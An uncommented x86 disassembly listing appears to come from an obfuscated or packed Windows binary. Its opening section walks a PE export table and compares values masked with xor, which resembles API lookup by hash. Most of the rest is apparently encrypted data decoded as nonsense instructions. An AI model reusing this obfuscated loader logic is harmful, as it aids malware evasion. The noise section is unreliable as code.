  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	jns    0x406348
  40635c:	xchg   BYTE PTR [ebx],ah
  40635e:	cmp    BYTE PTR [ebx],bh
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx-0x4a]
  406367:	push   edi
  406368:	mov    edx,DWORD PTR [esi+ebp*1-0x35c26bec]
  40636f:	ins    DWORD PTR es:[edi],dx
  406370:	cmp    DWORD PTR [edx+0x4d249e65],esi
  406376:	pop    ss
  406377:	aad    0xa2
  406379:	inc    BYTE PTR [ecx]
  40637b:	jno    0x4063f9
  40637d:	jl     0x4063f4
  40637f:	add    al,0xb3
  406381:	sbb    DWORD PTR [eax+0x2063a91d],eax
  406387:	jp     0x4063b4
  406389:	adc    ecx,ebp
  40638b:	shr    BYTE PTR [edi-0x670ef7e3],1
  406391:	xor    BYTE PTR [edi-0x7d],bh
  406394:	inc    ebx
  406395:	and    ebx,esi
  406397:	fidiv  WORD PTR [ebx]
  406399:	jmp    0x86e69593
  40639e:	pop    ecx
  40639f:	cmp    eax,0x98aaebc5
  4063a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063a5:	push   ebx
  4063a6:	dec    ecx
  4063a7:	pop    edi
  4063a8:	fwait
  4063a9:	(bad)  
  4063aa:	ficomp WORD PTR [edx+ebx*8]
  4063ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063ae:	inc    esi
  4063af:	jnp    0x40639d
  4063b1:	and    dl,dh
  4063b3:	rol    DWORD PTR [edx],1
  4063b5:	in     eax,dx
  4063b6:	jo     0x4063e5
  4063b8:	sbb    edx,DWORD PTR [ecx-0x7e]
  4063bb:	dec    edx
  4063bc:	sub    dl,BYTE PTR [esi+0x538c5329]
  4063c2:	and    DWORD PTR [esi],esi
  4063c4:	sub    BYTE PTR [ebx+0x68],dh
  4063c7:	inc    esi
  4063c8:	rcl    BYTE PTR [eax],0x86
  4063cb:	pusha  
  4063cc:	mov    ds:0xc9f55da5,eax
  4063d1:	icebp  
  4063d2:	shl    DWORD PTR [ebx+0x12],0x88
  4063d6:	sbb    dl,BYTE PTR [esi-0x4b3fa02a]
  4063dc:	es dec ecx
  4063de:	stc    
  4063df:	addr16 mov al,ds:0x83c2
  4063e3:	pop    ebx
  4063e4:	jp     0x4063bb
  4063e6:	jg     0x40643e
  4063e8:	xchg   esi,eax
  4063e9:	or     ebx,DWORD PTR [eax-0x68]
  4063ec:	or     bl,bl
  4063ee:	cmc    
  4063ef:	loope  0x4063b5
  4063f1:	call   0x14a6f049
  4063f6:	out    dx,al
  4063f7:	pop    es
  4063f8:	std    
  4063f9:	xchg   esi,eax
  4063fa:	push   ebp
  4063fb:	jnp    0x4063d1
  4063fd:	and    BYTE PTR [edi],bl
  4063ff:	popa   
  406400:	test   DWORD PTR [edx+0x65ceabc8],ecx
  406406:	fsub   DWORD PTR [edi+0x46dfe5fc]
  40640c:	jnp    0x406416
  40640e:	sub    bh,BYTE PTR [edx]
  406410:	jmp    0x45fe:0xb174d313
  406417:	xor    eax,0x344583c4
  40641c:	xor    eax,0x33034b32
  406421:	call   0x9acc2396
  406426:	add    edi,DWORD PTR [eax]
  406428:	add    eax,0x92b271f9
  40642d:	dec    eax
  40642e:	cmp    al,0xf3
  406430:	daa    
  406431:	fisttp WORD PTR [edx-0x5c878457]
  406437:	or     al,0x16
  406439:	stc    
  40643a:	mov    ch,BYTE PTR [ecx+0x5885502f]
  406440:	push   0x6ab3ee8b
  406445:	(bad)  [edx+0x5573b6c2]
  40644b:	dec    ebp
  40644c:	push   ecx
  40644d:	in     eax,0xe8
  40644f:	xchg   esi,ebp
  406451:	mov    ah,ah
  406453:	or     al,0xff
  406455:	cmp    ecx,DWORD PTR [ebp-0x1d03bfa2]
  40645b:	sbb    esi,0xffffffe4
  40645e:	mov    al,0xd
  406460:	popf   
  406461:	jae    0x406424
  406463:	bnd jo 0x40649c
  406466:	leave  
  406467:	and    esi,DWORD PTR ds:0xcaa8c782
  40646d:	xchg   BYTE PTR [edi-0x3],ch
  406470:	jmp    0x97c99d76
  406475:	int    0x6c
  406477:	xor    al,0xb
  406479:	loope  0x406423
  40647b:	inc    ebx
  40647c:	pushf  
  40647d:	fisub  DWORD PTR [edx]
  40647f:	icebp  
  406480:	dec    esp
  406481:	xchg   edi,eax
  406482:	sub    eax,0x276b75c
  406487:	push   0xbd548718
  40648c:	call   0x563:0xb47a46af
  406493:	push   eax
  406494:	xchg   edx,eax
  406495:	in     al,0x21
  406497:	dec    edx
  406498:	fcomp  DWORD PTR [esi-0x3c]
  40649b:	mov    dh,0xeb
  40649d:	mov    DWORD PTR [ecx],0x79e50ac6
  4064a3:	jns    0x4064d0
  4064a5:	bound  esi,QWORD PTR [ecx-0x35]
  4064a8:	(bad)  
  4064a9:	clc    
  4064aa:	shr    DWORD PTR [ecx-0x9],1
  4064ad:	out    0x9c,al
  4064af:	rcl    BYTE PTR [ebp+0x6468b349],0x73
  4064b6:	jmp    0x40649a
  4064b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064b9:	(bad)  
  4064ba:	repnz mov dh,0xdb
  4064bd:	shr    DWORD PTR [edi+0x70],1
  4064c0:	xor    al,0xf6
  4064c2:	mov    al,ds:0x881b766d
  4064c7:	sahf   
  4064c8:	xor    al,0x11
  4064ca:	test   bl,bl
  4064cc:	jmp    0xe77e2245
  4064d1:	int    0x5c
  4064d3:	test   al,0x9c
  4064d5:	jl     0x406543
  4064d7:	call   0xac42:0x624ae11f
  4064de:	loope  0x406493
  4064e0:	mov    dl,0x36
  4064e2:	pop    ss
  4064e3:	fnstenv [edi-0x71b6e582]
  4064e9:	xor    ebp,DWORD PTR [ebx+edx*4+0x6a]
  4064ed:	pop    ebx
  4064ee:	(bad)  
  4064ef:	jo     0x40650e
  4064f1:	jnp    0x40656a
  4064f3:	jmp    0x170b73da
  4064f8:	int3   
  4064f9:	jmp    0xef5c:0x3cbc9f21
  406500:	lds    eax,FWORD PTR [ebx+esi*2-0x372488aa]
  406507:	mov    ebp,0x869bfde1
  40650c:	jb     0x4064d2
  40650e:	xchg   DWORD PTR [esi+0x6b2953e5],ebx
  406514:	mov    al,ds:0x4f060639
  406519:	ins    BYTE PTR es:[edi],dx
  40651a:	test   al,0xbb
  40651c:	sbb    eax,0xd4a77b96
  406521:	scas   eax,DWORD PTR es:[edi]
  406522:	or     BYTE PTR [ebx-0x78],0x99
  406526:	pushf  
  406527:	cwde   
  406528:	jb     0x4064c1
  40652a:	and    al,0xce
  40652c:	inc    edi
  40652d:	mov    dh,0x41
  40652f:	(bad)  
  406530:	into   
  406531:	sti    
  406532:	(bad)  
  406533:	mov    dl,0x7
  406535:	cwde   
  406536:	jle    0x4064c9
  406538:	jmp    0x406551
  40653a:	fnstcw WORD PTR [ecx+0x4c3764aa]
  406540:	(bad)  
  406541:	ins    DWORD PTR es:[edi],dx
  406542:	mov    ?,WORD PTR [eax]
  406544:	inc    edx
  406545:	adc    cl,dl
  406547:	xchg   esp,eax
  406548:	retf   0xd750
  40654b:	jecxz  0x406526
  40654d:	arpl   WORD PTR [esi],ax
  40654f:	push   ebx
  406550:	aaa    
  406551:	enter  0xefb7,0x6c
  406555:	adc    DWORD PTR [eax-0x2a31d3bf],0xf6c29418
  40655f:	sbb    dh,BYTE PTR [eax+0x61671f83]
  406565:	xchg   ebp,eax
  406566:	retf   
  406567:	push   0x2e
  406569:	push   ebx
  40656a:	and    BYTE PTR [ecx+0x51],bh
  40656d:	adc    edx,ecx
  40656f:	cmp    ah,BYTE PTR [esi]
  406571:	loope  0x40658f
  406573:	push   0xffffffaf
  406575:	pop    esi
  406576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406577:	or     al,0x25
  406579:	xchg   BYTE PTR [ecx*8-0x63bee484],ah
  406580:	pushf  
  406581:	sbb    DWORD PTR [esi+edx*8],0x5c3fd846
  406588:	test   esp,eax
  40658a:	sbb    eax,0xaa6e3741
  40658f:	push   cs
  406590:	fwait
  406591:	rol    DWORD PTR [ebx+0x53],cl
  406594:	sub    DWORD PTR [edi+0x71],eax
  406597:	mov    eax,0xf41896f4
  40659c:	scas   al,BYTE PTR es:[edi]
  40659d:	adc    DWORD PTR [eax],0xe7d4489f
  4065a3:	loope  0x40660a
  4065a5:	cmc    
  4065a6:	jmp    0x3be1:0x58ae0e13
  4065ad:	mov    ah,0x46
  4065af:	cmp    BYTE PTR [ebp-0x7036c42c],ch
  4065b5:	dec    eax
  4065b6:	fcomp  QWORD PTR [edx+0x55]
  4065b9:	mov    esi,0x2f8c2410
  4065be:	xor    eax,0x26d0537f
  4065c3:	arpl   WORD PTR [esi+0x73292341],sp
  4065c9:	push   0xffffff97
  4065cb:	dec    edx
  4065cc:	or     DWORD PTR [edi+ebx*4+0x3b9210a1],esp
  4065d3:	push   cs
  4065d4:	retf   
  4065d5:	(bad)  
  4065d6:	out    dx,eax
  4065d7:	inc    ecx
  4065d8:	loope  0x406585
  4065da:	adc    eax,0xc8056a3e
  4065df:	jo     0x4065e1
  4065e1:	sbb    al,0x2c
  4065e3:	mov    al,0xcb
  4065e5:	mul    BYTE PTR [eax+0x57]
  4065e8:	xor    DWORD PTR [ebx+0x15],ecx
  4065eb:	cmp    al,0x98
  4065ed:	xchg   esi,eax
  4065ee:	sub    DWORD PTR [eax-0x6d],ecx
  4065f1:	in     al,dx
  4065f2:	cmp    esi,esi
  4065f4:	rol    DWORD PTR [eax+0x2962a847],0x36
  4065fb:	aaa    
  4065fc:	mov    edi,0x8dc1c476
  406601:	les    ecx,FWORD PTR [edx-0x16]
  406604:	pop    ecx
  406605:	xor    BYTE PTR ds:[edi],ah
  406608:	jns    0x4065ac
  40660a:	scas   al,BYTE PTR es:[edi]
  40660b:	mov    ebp,0x34ce5969
  406610:	mov    eax,0x5674743f
  406615:	cmp    eax,0x77a38627
  40661a:	icebp  
  40661b:	pop    eax
  40661c:	pop    ebx
  40661d:	ror    al,cl
  40661f:	imul   esi,DWORD PTR [ecx+0x2c60cb2a],0xf14be5f3
  406629:	xchg   esi,eax
  40662a:	sbb    bh,BYTE PTR [eax-0x324a1052]
  406630:	lods   al,BYTE PTR ds:[esi]
  406631:	mov    ah,0x69
  406633:	or     BYTE PTR [edx+0x31],ah
  406636:	not    BYTE PTR [ebp+0x38]
  406639:	cli    
  40663a:	repnz push ebx
  40663c:	cmp    ebp,DWORD PTR [esi]
  40663e:	mov    dl,0xad
  406640:	cmp    DWORD PTR [edx],edx
  406642:	add    BYTE PTR [edi-0x7c2661ad],dl
  406648:	test   eax,0xe2815483
  40664d:	mov    ebx,0xe48356d3
  406652:	push   ecx
  406653:	dec    esp
  406654:	mov    ebx,0x9b90e168
  406659:	stos   DWORD PTR es:[edi],eax
  40665a:	cmp    BYTE PTR [edx-0x4f0500d4],bl
  406660:	jp     0x40667e
  406662:	pop    edi
  406663:	je     0x40662e
  406665:	mov    dh,0xb
  406667:	sar    dh,0x99
  40666a:	jo     0x4065f4
  40666c:	push   edx
  40666d:	jg     0x406637
  40666f:	in     eax,dx
  406670:	xor    ah,BYTE PTR [edx]
  406672:	mov    ds:0xbd147c47,eax
  406677:	arpl   WORD PTR [esi-0x562d32e8],bx
  40667d:	stos   BYTE PTR es:[edi],al
  40667e:	sbb    al,0x65
  406680:	pop    es
  406681:	lods   al,BYTE PTR ds:[esi]
  406682:	ror    DWORD PTR [ecx],1
  406684:	lahf   
  406685:	mov    al,ds:0xbf65dca4
  40668a:	scas   al,BYTE PTR es:[edi]
  40668b:	or     dh,dl
  40668d:	mov    ds:0x392f6e55,al
  406692:	pop    esi
  406693:	mov    ecx,0x1e62691e
  406698:	das    
  406699:	xor    al,0x9e
  40669b:	push   esp
  40669c:	or     ecx,DWORD PTR [esi-0x513a0a3]
  4066a2:	into   
  4066a3:	test   eax,0x396bc773
  4066a8:	imul   ecx,esp,0x76c91842
  4066ae:	mov    ecx,0x14c7449e
  4066b3:	inc    eax
  4066b4:	enter  0xa3f4,0xa6
  4066b8:	arpl   WORD PTR cs:[edi-0x74f7f66b],dx
  4066bf:	jg     0x4066c9
  4066c1:	scas   al,BYTE PTR es:[edi]
  4066c2:	jmp    0x40669f
  4066c4:	push   0x22db1f59
  4066c9:	test   DWORD PTR [edx-0x1e],ebp
  4066cc:	jae    0x4066b0
  4066ce:	cmp    BYTE PTR [edx+ebx*2-0x1c733a4a],bl
  4066d5:	into   
  4066d6:	inc    esi
  4066d7:	push   eax
  4066d8:	push   edi
  4066d9:	imul   BYTE PTR [ebx-0x33af9165]
  4066df:	les    ebx,FWORD PTR [edi+edi*4]
  4066e2:	inc    edi
  4066e3:	jmp    0x4066c4
  4066e5:	add    al,0x13
  4066e7:	popf   
  4066e8:	cmc    
  4066e9:	out    dx,al
  4066ea:	or     DWORD PTR [ecx+0x38c5a852],0x4d1ee3cc
  4066f4:	leave  
  4066f5:	fidiv  DWORD PTR [ebx]
  4066f7:	cmp    eax,0xd7995a48
  4066fc:	xchg   ebp,eax
  4066fd:	cmp    al,0x40
  4066ff:	fidiv  DWORD PTR ss:[ebp+0x3d20e4d4]
  406706:	sub    DWORD PTR [eax+ecx*8-0x4b],ebp
  40670a:	jb     0x406724
  40670c:	or     esp,DWORD PTR [ebx+eax*4-0x7ea1149e]
  406713:	jp     0x406755
  406715:	retf   0x2a96
  406718:	jns    0x406722
  40671a:	hlt    
  40671b:	dec    esp
  40671c:	imul   edi,DWORD PTR ds:0xacedb87f,0xd70796c2
  406726:	adc    ebx,DWORD PTR [ecx-0x41]
  406729:	fadd   DWORD PTR [ecx]
  40672b:	rol    DWORD PTR [ecx+0x53972d26],0xae
  406732:	fwait
  406733:	jg     0x4066d1
  406735:	mov    es,edx
  406737:	cld    
  406738:	adc    ebx,DWORD PTR ds:0x1357eda9
  40673e:	dec    esi
  40673f:	aam    0xb7
  406741:	and    bh,BYTE PTR [ecx]
  406743:	fimul  WORD PTR [ebx+0x1b]
  406746:	into   
  406747:	cmp    al,BYTE PTR [ebx-0x65acabf8]
  40674d:	xor    al,0x8
  40674f:	ins    BYTE PTR es:[edi],dx
  406750:	fisttp WORD PTR [esi]
  406752:	fs or  al,0xe0
  406755:	rol    ch,1
  406757:	jp     0x4066f6
  406759:	dec    esi
  40675a:	sub    bh,bh
  40675c:	jb     0x4067cd
  40675e:	sub    DWORD PTR [ebp-0x6d],eax
  406761:	data16 and BYTE PTR [eax+eiz*1+0x46a7e2a],0x1b
  40676a:	xchg   ecx,eax
  40676b:	sti    
  40676c:	mov    dl,0xdf
  40676e:	xor    ebx,esp
  406770:	fadd   DWORD PTR [esi]
  406772:	int    0xfe
  406774:	js     0x4067e5
  406776:	jge    0x40678f
  406778:	inc    edx
  406779:	sbb    ebp,eax
  40677b:	das    
  40677c:	(bad)  
  40677d:	stc    
  40677e:	jle    0x40671f
  406780:	jo     0x4067db
  406782:	sar    ch,cl
  406784:	adc    BYTE PTR [ebx+0x32],bh
  406787:	ror    bh,0x59
  40678a:	or     bl,ch
  40678c:	add    BYTE PTR [esp+ecx*1],ch
  40678f:	jb     0x4067ed
  406791:	fmul   st,st(7)
  406793:	jge    0x4067ef
  406795:	call   0x67ae:0xb2f78cc7
  40679c:	xor    edx,DWORD PTR [eax+eiz*8]
  40679f:	retf   0x294f
  4067a2:	push   ebp
  4067a3:	push   esi
  4067a4:	iret   
  4067a5:	call   0xd8a4036b
  4067aa:	lods   eax,DWORD PTR ds:[esi]
  4067ab:	or     ebp,DWORD PTR [edx+eiz*2-0x2f]
  4067af:	and    DWORD PTR [edx+0x53],0x63
  4067b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b4:	into   
  4067b5:	inc    edx
  4067b6:	shl    BYTE PTR [ecx-0x49],1
  4067b9:	lahf   
  4067ba:	jmp    0x81c1:0x5cc769a3
  4067c1:	sbb    esp,esi
  4067c3:	(bad)  
  4067c4:	je     0x406805
  4067c6:	cmp    DWORD PTR [esi+0x4b5ff3a9],0x13bd0be6
  4067d0:	ficom  WORD PTR [ebp+0x9]
  4067d3:	sti    
  4067d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d5:	fistp  DWORD PTR [eax]
  4067d7:	or     esi,DWORD PTR [ebx]
  4067d9:	mov    dl,0x35
  4067db:	xor    BYTE PTR [ecx-0x21e6d97f],cl
  4067e1:	shl    DWORD PTR [edx-0x194da36b],cl
  4067e7:	outs   dx,BYTE PTR ds:[esi]
  4067e8:	push   esp
  4067e9:	and    ah,al
  4067eb:	jo     0x406828
  4067ed:	pop    ecx
  4067ee:	retf   
  4067ef:	jmp    0x8b23219f
  4067f4:	(bad)  
  4067f5:	mov    cs,WORD PTR [edx-0x32959016]
  4067fb:	inc    ebx
  4067fc:	inc    ebx
  4067fd:	sub    DWORD PTR [ecx+ebp*1-0x1c],0x5a08e890
  406805:	push   0x40fe590b
  40680a:	add    dl,BYTE PTR [edi-0x4edb0bc3]
  406810:	mov    BYTE PTR [eax-0x346857cb],0xed
  406817:	lods   eax,DWORD PTR ds:[esi]
  406818:	add    ebp,DWORD PTR [esp+esi*4+0x5b]
  40681c:	out    0xda,eax
  40681e:	add    eax,0x5107d0bd
  406823:	in     al,0xa5
  406825:	push   ss
  406826:	push   cs
  406827:	xchg   ecx,eax
  406828:	rcr    BYTE PTR [edi-0x5119f4f5],0xcd
  40682f:	xor    DWORD PTR [eax-0x1f13fe6e],esi
  406835:	dec    edx
  406836:	cld    
  406837:	cmp    ch,BYTE PTR [edx-0x6647083d]
  40683d:	mov    edx,0xccffb9af
  406842:	add    ch,BYTE PTR ds:0x2c671db2
  406848:	fcomp  DWORD PTR [eax-0x5f]
  40684b:	push   0xf41820af
  406850:	jo     0x406821
  406852:	sar    DWORD PTR [eax],1
  406854:	stc    
  406855:	fwait
  406856:	ret    0xcf73
  406859:	mov    ds:0xe41bfbf7,eax
  40685e:	imul   esi,DWORD PTR [esi],0x8806147c
  406864:	es push 0xfffffff9
  406867:	adc    al,0xe6
  406869:	cmc    
  40686a:	mov    edi,0xf8c728ab
  40686f:	xchg   esp,eax
  406870:	in     al,dx
  406871:	adc    BYTE PTR [eax+0x46],al
  406874:	hlt    
  406875:	add    ebx,DWORD PTR [edi]
  406877:	jne    0x406804
  406879:	(bad)  
  40687a:	and    DWORD PTR [edi+0x27],eax
  40687d:	hlt    
  40687e:	fld    TBYTE PTR [esi+0x74]
  406881:	fwait
  406882:	jle    0x406869
  406884:	mov    esi,0xaf62a115
  406889:	mov    esp,0x6731e09d
  40688e:	xor    BYTE PTR [ebx],bh
  406890:	pop    ss
  406891:	repnz xor al,0x32
  406894:	out    0x95,eax
  406896:	pop    edx
  406897:	xor    al,0xc2
  406899:	and    eax,0xdf4359c7
  40689e:	xchg   ebx,eax
  40689f:	inc    edx
  4068a0:	push   ds
  4068a1:	retf   
  4068a2:	arpl   WORD PTR [edi+0x1cfbbd8d],bx
  4068a8:	ins    BYTE PTR es:[edi],dx
  4068a9:	cli    
  4068aa:	inc    ebp
  4068ab:	das    
  4068ac:	jl     0x406881
  4068ae:	popf   
  4068af:	shr    BYTE PTR [edx+eax*2-0xf],1
  4068b3:	fwait
  4068b4:	xor    dh,cl
  4068b6:	out    dx,eax
  4068b7:	inc    eax
  4068b8:	jbe    0x406918
  4068ba:	fdiv   QWORD PTR [esi-0x45683eee]
  4068c0:	adc    eax,0x7a2927f7
  4068c5:	dec    esp
  4068c6:	cmp    DWORD PTR [edi+0x46],esi
  4068c9:	enter  0xa052,0x15
  4068cd:	test   DWORD PTR [eax-0x12],eax
  4068d0:	pop    esp
  4068d1:	and    DWORD PTR [eax+0x2b],edx
  4068d4:	dec    ebx
  4068d5:	sub    ecx,ebp
  4068d7:	mov    ss,WORD PTR [esi]
  4068d9:	aas    
  4068da:	or     al,0x52
  4068dc:	adc    BYTE PTR [ecx-0x126ceb77],ah
  4068e2:	clc    
  4068e3:	or     al,0xa0
  4068e5:	loopne 0x4068ed
  4068e7:	cmp    DWORD PTR [esi+0x187b06f4],0x15
  4068ee:	xor    al,0xe4
  4068f1:	test   eax,0x2dfaaf44
  4068f6:	add    DWORD PTR [edx+0x1],ebx
  4068f9:	xchg   ebp,eax
  4068fa:	sub    esi,ebp
  4068fc:	push   edi
  4068fd:	inc    ebx
  4068fe:	imul   esp,esp,0x7c
  406901:	mov    edx,0xb929cddb
  406906:	dec    esi
  406907:	dec    esi
  406908:	in     eax,dx
  406909:	stos   BYTE PTR es:[edi],al
  40690a:	or     edi,DWORD PTR [ecx]
  40690c:	stc    
  40690d:	ins    DWORD PTR es:[edi],dx
  40690e:	fisttp QWORD PTR [eax]
  406910:	stc    
  406911:	sub    al,0xcd
  406913:	push   0xd6b4e41c
  406918:	imul   ebp,DWORD PTR ds:0x5b1cde9f,0x9b953a19
  406922:	pop    esi
  406923:	repnz test DWORD PTR [ecx+esi*2+0x75],0x7f040485
  40692c:	cmp    cx,WORD PTR [eax+ecx*4+0x1]
  406931:	inc    ebx
  406932:	ror    esi,cl
  406934:	ficomp WORD PTR [edi]
  406936:	add    eax,esi
  406938:	outs   dx,BYTE PTR ds:[esi]
  406939:	fsub   QWORD PTR [edx+0x2d3d226]
  40693f:	xor    edx,DWORD PTR fs:[edi]
  406942:	pop    edi
  406943:	pop    esi
  406944:	adc    bh,BYTE PTR [ebx-0x26]
  406947:	lock and al,0xcb
  40694a:	ja     0x40699d
  40694c:	xor    al,0x24
  40694e:	push   ebx
  40694f:	shr    DWORD PTR [esi+edx*4],1
  406952:	mov    ch,bh
  406954:	(bad)  
  406955:	sete   BYTE PTR [esi+0xc]
  406959:	mov    ebx,0xe3ac3713
  40695e:	mov    dl,0x37
  406960:	cli    
  406961:	pop    ss
  406962:	popf   
  406963:	mov    dl,0xb3
  406965:	(bad)  
  406966:	dec    esi
  406967:	xchg   esi,eax
  406968:	add    eax,0x4817b27b
  40696d:	dec    edx
  40696e:	ret    0x2157
  406971:	or     al,0x4c
  406973:	and    edi,ebp
  406975:	cmp    BYTE PTR [ebp+0x58],bh
  406978:	into   
  406979:	fisttp DWORD PTR [ebx-0x15]
  40697c:	or     ch,BYTE PTR [ecx+0x4d0774c2]
  406982:	sub    al,0x1d
  406984:	adc    eax,0x48dec771
  406989:	adc    dl,BYTE PTR [edi+edi*1-0x3f]
  40698d:	fiadd  DWORD PTR ds:[ebp-0x1f]
  406991:	cmp    al,0x2a
  406993:	addr16 dec esp
  406995:	xchg   esp,eax
  406996:	les    esp,FWORD PTR [ebx-0x2e]
  406999:	call   0xf49e:0xe97c4d02
  4069a0:	sar    edi,cl
  4069a2:	or     edx,0xffffff90
  4069a5:	jmp    0x129:0x537821d3
  4069ac:	mov    dl,0x48
  4069ae:	or     eax,0xb519be62
  4069b3:	fcom   DWORD PTR [edi+eiz*4]
  4069b6:	je     0x40693e
  4069b8:	pop    edi
  4069b9:	xchg   DWORD PTR [ebx-0x32746a99],ebp
  4069bf:	mov    bh,0xe9
  4069c1:	pop    edi
  4069c2:	pop    ss
  4069c3:	lahf   
  4069c4:	pop    es
  4069c5:	push   edi
  4069c6:	lock aas 
  4069c8:	adc    bl,dh
  4069ca:	pop    eax
  4069cb:	call   0x5017:0x1cfbb0af
  4069d2:	imul   ebx,DWORD PTR [ebp+0x3cba6ea2],0xf3cf4374
  4069dc:	stc    
  4069dd:	adc    DWORD PTR [esi-0x79],edx
  4069e0:	test   BYTE PTR [esi-0x9],ah
  4069e3:	scas   eax,DWORD PTR es:[edi]
  4069e4:	imul   eax,DWORD PTR [ecx],0xffffffa3
  4069e7:	jle    0x406999
  4069e9:	in     eax,0x62
  4069eb:	sbb    ebp,DWORD PTR [ecx+0xb]
  4069ee:	mov    ds:0x73673fdb,eax
  4069f3:	das    
  4069f4:	ret    0xb370
  4069f7:	jge    0x40697c
  4069f9:	lahf   
  4069fa:	add    BYTE PTR [ecx+0x4a],ch
  4069fd:	pop    es
  4069fe:	dec    ebx
  4069ff:	add    BYTE PTR [esi-0x623027dd],0xb6
  406a06:	sub    DWORD PTR [ecx+0x5eba412],esp
  406a0c:	lock fnstenv [ecx+eax*8-0x48]
  406a11:	in     eax,dx
  406a12:	ins    DWORD PTR es:[edi],dx
  406a13:	jp     0x4069f1
  406a15:	nop
  406a16:	(bad)  
  406a17:	sbb    al,0x49
  406a19:	dec    eax
  406a1a:	add    dh,BYTE PTR [ebp+esi*4+0x4b]
  406a1e:	cli    
  406a1f:	arpl   ax,bx
  406a21:	cmp    ebx,edx
  406a23:	call   0x3eba0a11
  406a28:	outs   dx,DWORD PTR ds:[esi]
  406a29:	pop    edi
  406a2a:	ror    DWORD PTR [edi+ebp*1+0x7312f41c],1
  406a31:	sub    eax,0x25ad8928
  406a36:	imul   DWORD PTR [eax-0x474dd278]
  406a3c:	test   DWORD PTR [edx+0x1],ebx
  406a3f:	inc    ebp
  406a40:	fist   DWORD PTR [ecx]
  406a42:	inc    ebp
  406a43:	retf   0x6c17
  406a46:	mov    al,ds:0xf6f0db81
  406a4b:	ret    
  406a4c:	cmp    eax,0x57bededf
  406a51:	push   0x85c969b5
  406a56:	xor    BYTE PTR [edx-0x1a],0xf2
  406a5a:	add    al,0xec
  406a5c:	dec    eax
  406a5d:	pop    esi
  406a5e:	and    BYTE PTR [ebx],ah
  406a60:	pop    ebp
  406a61:	push   esp
  406a62:	and    al,0xdb
  406a64:	cmp    ebx,edi
  406a66:	sbb    DWORD PTR [eax-0x3],esp
